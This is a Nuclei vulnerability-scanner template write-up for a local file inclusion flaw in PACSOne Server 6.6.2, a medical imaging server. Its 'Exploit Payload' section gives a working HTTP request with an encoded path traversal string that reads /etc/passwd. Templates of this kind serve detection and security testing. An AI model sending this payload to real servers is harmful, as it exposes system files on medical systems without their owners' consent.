# Nuclei Template: PACSOne Server 6.6.2 - Local File Inclusion
**Template ID:** pacsone-server-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`pacsone-server-lfi.yaml`)

## Vulnerability Information & PoC

## Description
PACSOne Server 6.6.2 is vulnerable to local file inclusion via its integrated DICOM Web Viewer.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd
```

## References
- https://cxsecurity.com/issue/WLB-2018010303
